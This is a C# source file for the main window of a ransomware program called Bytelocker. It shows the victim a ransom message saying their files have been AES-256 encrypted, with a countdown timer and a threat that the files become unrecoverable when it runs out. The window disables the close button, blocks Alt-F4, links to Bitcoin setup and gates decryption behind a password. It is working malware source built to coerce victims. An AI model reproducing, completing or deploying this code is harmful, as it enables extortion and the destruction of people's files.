using Bytelocker.CryptoManager;
using Bytelocker.Settings;
using Bytelocker.src.UI;
using Bytelocker.Tools;
using System;
using System.Threading;
using System.Windows.Forms;

namespace Bytelocker.UI
{
    public partial class MainWindow : Form
    {
        private static int MAX_DECRYPT_FILE_NAME_LENGHT = 90;

        private TimeManager tm;
        private PasswordManager pm;
        private RegistryManager rm;

        private int progress_bar_inc;
        private String current_decrypt_file_local = "null";

        public static String current_decrypt_file = "null";
        public static bool error_decrypt_file = false;
        public static bool error_decrypt_file_continue = false;

        private LinkLabel llAESInfo, llListOfInfectedFiles;

        public MainWindow()
        {
            InitializeComponent();
            MaximizeBox = false;
            this.tm = new TimeManager();
            this.rm = new RegistryManager();
            this.tm.ReadFromRegistry();
            llAESInfo = new LinkLabel();
            llListOfInfectedFiles = new LinkLabel();
            llListOfInfectedFiles.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llListOfInfectedFiles_Click);
            llAESInfo.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llAESInfo_Click);
        }

        // remove x button
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ClassStyle = cp.ClassStyle | 0x200;
                return cp;
            }
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            this.MainWindowScreenOne();
        }

        private void MainWindowScreenOne()
        {
            this.lbCurrentFileDecrypt.Hide();
            this.pbDecryptProgress.Hide();
            this.BtnVerify.Hide();
            this.tbPassInput.Hide();
            this.rtfInfo.Clear();
            this.UpdateTime();

            llAESInfo.Show();
            llListOfInfectedFiles.Show();
            lbTitle.Show();

            // rtf box
            this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted." + "\n\n");

            llListOfInfectedFiles.Text = "Here";
            llListOfInfectedFiles.AutoSize = true;
            llListOfInfectedFiles.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llListOfInfectedFiles);
            this.rtfInfo.AppendText(llListOfInfectedFiles.Text);
            this.rtfInfo.AppendText(new String(' ', 3));
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;

            this.rtfInfo.AppendText("is a complete list of encrypted files, you can verify this manually." + "\n\n" + "Encryption was produced" +
                " using");

            llAESInfo.Text = "AES-256";
            llAESInfo.AutoSize = true;
            llAESInfo.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
            this.rtfInfo.Controls.Add(llAESInfo);
            this.rtfInfo.AppendText(llAESInfo.Text);
            this.rtfInfo.AppendText(new String(' ', 3));
            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;

            this.rtfInfo.AppendText("in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." + "\n\n");

            this.rtfInfo.AppendText("NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
            // end rtf box
        }

        private void BtnNext_Click(object sender, EventArgs e)
        {
            this.rtfInfo.Clear();
            llAESInfo.Hide();
            llListOfInfectedFiles.Hide();

            this.lbTitle.Hide();
            this.tbPassInput.Show();
            this.btnNext.Hide();
            this.BtnVerify.Show();

            this.rtfInfo.AppendText("Enter password to unlock, then click 'Verify' to begin decryption.");
            this.rtfInfo.Select(this.rtfInfo.GetFirstCharIndexFromLine(0), this.rtfInfo.Lines[0].Length);
            this.rtfInfo.SelectionBullet = true;
            this.rtfInfo.DeselectAll();
        }

        private void BtnVerify_Click(object sender, EventArgs e)
        {
            this.pm = new PasswordManager();
            this.pm.FetchPassword();
            if (!(this.tbPassInput.Text == this.pm.returnPassword()))
            {
                MessageBox.Show("Invalid Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Console.WriteLine(this.pm.returnPassword());
            }
            else
            {
                this.tmTimeLeftRefresher.Stop();
                this.BtnVerify.Hide();
                
                this.lbTimeLeft.Text = "";
                this.rtfInfo.Clear();
                this.tbPassInput.Hide();
                this.lbTitleTime.Hide();
                this.lbTitle.Text = "Decrypting . . .";
                this.lbTitle.Show();
                this.lbCurrentFileDecrypt.Show();
                this.pbDecryptProgress.Show();

                this.progress_bar_inc = this.pbDecryptProgress.Maximum / this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;

               this.tmTimerDecrypt.Start();

                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;
                    Bytelocker.Decrypt();
                }).Start();
            }

            this.pm = null;
        }

        // override alt-f4
        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void On_llAESInfo_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
        }

        private void On_llBitcoinInfo_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://bitcoin.org/en/getting-started");
        }


        private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
        {
            this.LaunchListOfEncryptedFilesWindow();
        }

        private void UpdateTimeLeftEvent(object sender, EventArgs e)
        {
            this.UpdateTime();
        }


        private void tmTimerDecrypt_Tick(object sender, EventArgs e)
        {
            if (error_decrypt_file)
            {
                this.tmTimerDecrypt.Stop();

                DialogResult messageBoxInput = MessageBox.Show("Failed to decrypt a previously encrypted file: \"" + MainWindow.current_decrypt_file + "\".\n\n" +
                    "The file may be damaged/removed/locked or used by another process", "Error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);

                if (messageBoxInput == DialogResult.Retry)
                {
                    error_decrypt_file_continue = true;
                    // add 2 second wait time after hitting retry
                    this.tmTimerDecrypt.Interval = 2000;
                } else
                {
                    error_decrypt_file_continue = true;
                    error_decrypt_file = false;

                    try
                    {
                        this.rm.DeleteValue(RegistryManager.FILES_KEY_NAME, current_decrypt_file);
                    }
                    catch (System.ArgumentException)
                    {
                        // if the value does not exist in registry
                    }
                }

                this.tmTimerDecrypt.Start();

                return;
            }

            // set interval to regular
            this.tmTimerDecrypt.Interval = 100;

            if (!(this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
            {
                if (!(this.current_decrypt_file_local == current_decrypt_file))
                {
                    this.current_decrypt_file_local = current_decrypt_file;

                    if (current_decrypt_file.Length > MAX_DECRYPT_FILE_NAME_LENGHT)
                    {
                        this.lbCurrentFileDecrypt.Text = FilePathTruncate.TruncatePath(current_decrypt_file, MAX_DECRYPT_FILE_NAME_LENGHT);
                    } else
                    {
                        this.lbCurrentFileDecrypt.Text = current_decrypt_file;
                    }

                    this.pbDecryptProgress.Increment(this.progress_bar_inc);
                }
            }
            else
            {
                this.tmTimerDecrypt.Stop();
                this.Visible = false;
                MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Bytelocker.Uninstall();
            }
        }

        private void UpdateTime()
        {
            int timeLeftSeconds = (int)this.tm.DetermineRemainingTimeInSeconds();

            if (timeLeftSeconds < 0)
            {
                this.tmTimeLeftRefresher.Stop();
                this.lbTimeLeft.Text = "00:00:00:00";

                // if time is 0, uninstall program
                this.Visible = false;
                Bytelocker.Uninstall();
            }
            else
            {
                this.lbTimeLeft.Text = (TimeSpan.FromSeconds(timeLeftSeconds)).ToString(@"dd\:hh\:mm\:ss");
            }
        }

        private void LaunchListOfEncryptedFilesWindow()
        {
            EncryptedFilesList efl = new EncryptedFilesList();
            efl.ShowDialog();
        }
    }
}
